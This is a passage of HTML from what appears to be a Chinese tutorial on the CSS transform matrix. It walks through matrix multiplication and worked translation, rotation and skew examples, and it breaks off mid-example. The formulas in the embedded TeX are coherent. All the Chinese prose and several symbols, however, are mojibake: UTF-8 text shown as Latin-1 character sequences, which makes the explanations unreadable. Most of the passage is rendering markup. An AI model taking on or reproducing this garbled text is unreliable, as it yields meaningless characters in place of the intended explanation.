class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">b</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">c</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">d</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">e</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></p>
<p>çŸ©é˜µä¹˜æ³•è§„åˆ™ä¸ºã€Œå‰çŸ©é˜µè¡Œ Ã— åçŸ©é˜µåˆ—ï¼Œæ±‚å’Œå¾—åˆ°ç»“æœã€ï¼š</p>
<ul>
<li>ç¬¬ä¸€è¡Œè¿ç®—ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mi>a</mi><mo>Ã—</mo><mi>x</mi><mo>+</mo><mi>c</mi><mo>Ã—</mo><mi>y</mi><mo>+</mo><mi>e</mi><mo>Ã—</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x' = a \times x + c \times y + e \times 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œå³ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mi>a</mi><mo>âˆ—</mo><mi>x</mi><mo>+</mo><mi>c</mi><mo>âˆ—</mo><mi>y</mi><mo>+</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">x' = a*x + c*y + e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.4653em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4653em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">e</span></span></span></span></span>ï¼›</li>
<li>ç¬¬äºŒè¡Œè¿ç®—ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mi>b</mi><mo>Ã—</mo><mi>x</mi><mo>+</mo><mi>d</mi><mo>Ã—</mo><mi>y</mi><mo>+</mo><mi>f</mi><mo>Ã—</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y' = b \times x + d \times y + f \times 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œå³ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mi>b</mi><mo>âˆ—</mo><mi>x</mi><mo>+</mo><mi>d</mi><mo>âˆ—</mo><mi>y</mi><mo>+</mo><mi>f</mi></mrow><annotation encoding="application/x-tex">y' = b*x + d*y + f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></span>ï¼›</li>
<li>ç¬¬ä¸‰è¡Œå›ºå®šä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œæ˜¯é½æ¬¡åæ ‡çš„çº¦å®šï¼Œç›®çš„æ˜¯è®©å¹³ç§»ï¼ˆeã€fï¼‰èƒ½èå…¥çŸ©é˜µä¹˜æ³•ï¼Œå¦åˆ™çº¯çº¿æ€§å˜æ¢æ— æ³•å®ç°å¹³ç§»æ•ˆæœã€‚</li>
</ul>
<h2 data-id="heading-4">ä¸‰ã€å®ä¾‹éªŒè¯ï¼šç”¨å…¬å¼æ‹†è§£åŸºç¡€å˜æ¢</h2>
<p>ç»“åˆå…·ä½“å˜æ¢åœºæ™¯ä»£å…¥å…¬å¼ï¼Œèƒ½æ›´ç›´è§‚ç†è§£å‚æ•°ä¸å…¬å¼çš„è”åŠ¨æ•ˆæœï¼Œä»¥ä¸‹å‡ä»¥å•ä½çŸ©é˜µï¼ˆæ— å˜æ¢ï¼šmatrix(1,0,0,1,0,0)ï¼‰ä¸ºåŸºå‡†ã€‚</p>
<h3 data-id="heading-5">1. çº¯å¹³ç§»ï¼ˆmatrix(1,0,0,1,50,30)ï¼‰</h3>
<p>å‚æ•°ä»£å…¥ï¼ša=1ã€b=0ã€c=0ã€d=1ã€e=50ã€f=30</p>
<p>å…¬å¼è®¡ç®—ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mn>1</mn><mo>âˆ—</mo><mi>x</mi><mo>+</mo><mn>0</mn><mo>âˆ—</mo><mi>y</mi><mo>+</mo><mn>50</mn><mo>=</mo><mi>x</mi><mo>+</mo><mn>50</mn></mrow><annotation encoding="application/x-tex">x' = 1*x + 0*y + 50 = x + 50</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">50</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">50</span></span></span></span></span>ï¼ˆX è½´ç»Ÿä¸€å³ç§» 50pxï¼‰</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mn>0</mn><mo>âˆ—</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo>âˆ—</mo><mi>y</mi><mo>+</mo><mn>30</mn><mo>=</mo><mi>y</mi><mo>+</mo><mn>30</mn></mrow><annotation encoding="application/x-tex">y' = 0*x + 1*y + 30 = y + 30</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">30</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">30</span></span></span></span></span>ï¼ˆY è½´ç»Ÿä¸€ä¸‹ç§» 30pxï¼‰</p>
<p>æ•ˆæœï¼šæ‰€æœ‰ç‚¹çš„åæ ‡ä»…å åŠ å¹³ç§»é‡ï¼Œå…ƒç´ æ•´ä½“ç§»åŠ¨ï¼Œæ— ç¼©æ”¾ã€å€¾æ–œã€‚</p>
<h3 data-id="heading-6">2. çº¯æ—‹è½¬ï¼ˆé¡ºæ—¶é’ˆæ—‹è½¬ 30Â°ï¼Œmatrix(0.866,0.5,-0.5,0.866,0,0)ï¼‰</h3>
<p>å‚æ•°å¯¹åº”ï¼šcos30Â°â‰ˆ0.866ã€sin30Â°=0.5ï¼Œå³ a=cosÎ¸ã€b=sinÎ¸ã€c=-sinÎ¸ã€d=cosÎ¸</p>
<p>å…¬å¼è®¡ç®—ï¼ˆä»¥åŸå§‹ç‚¹ (100, 0) ä¸ºä¾‹ï¼‰ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mn>0.866</mn><mo>âˆ—</mo><mn>100</mn><mo>+</mo><mo stretchy="false">(</mo><mo>âˆ’</mo><mn>0.5</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mn>0</mn><mo>+</mo><mn>0</mn><mo>â‰ˆ</mo><mn>86.6</mn></mrow><annotation encoding="application/x-tex">x' = 0.866*100 + (-0.5)*0 + 0 â‰ˆ 86.6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.866</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">100</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord">0.5</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">86.6</span></span></span></span></span></p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mn>0.5</mn><mo>âˆ—</mo><mn>100</mn><mo>+</mo><mn>0.866</mn><mo>âˆ—</mo><mn>0</mn><mo>+</mo><mn>0</mn><mo>=</mo><mn>50</mn></mrow><annotation encoding="application/x-tex">y' = 0.5*100 + 0.866*0 + 0 = 50</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.5</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">100</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.866</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">50</span></span></span></span></span></p>
<p>æ•ˆæœï¼šåŸå§‹ç‚¹ (100,0) æ—‹è½¬åå˜ä¸º (86.6,50)ï¼Œç¬¦åˆé¡ºæ—¶é’ˆæ—‹è½¬ 30Â° çš„åæ ‡å˜åŒ–ï¼Œè·¨è½´é¡¹ c<em>yã€b</em>x åœ¨æ­¤å¤„å®ç°äº†æ—‹è½¬çš„åç§»è°ƒèŠ‚ã€‚</p>
<h3 data-id="heading-7">3. çº¯å€¾æ–œï¼ˆX è½´å€¾æ–œ 30Â°ï¼Œmatrix(1,0,0.577,1,0,0)ï¼‰</h3>
<p>å‚æ•°å¯¹åº”ï¼štan30Â°â‰ˆ0.577ï¼Œå³ c=tanÏ†ï¼ˆÏ† ä¸ºå€¾æ–œè§’åº¦ï¼‰</p>
<p>å…¬å¼è®¡ç®—ï¼ˆä»¥åŸå§‹ç‚¹ (0, 100) ä¸ºä¾‹ï¼‰ï¼š</p>
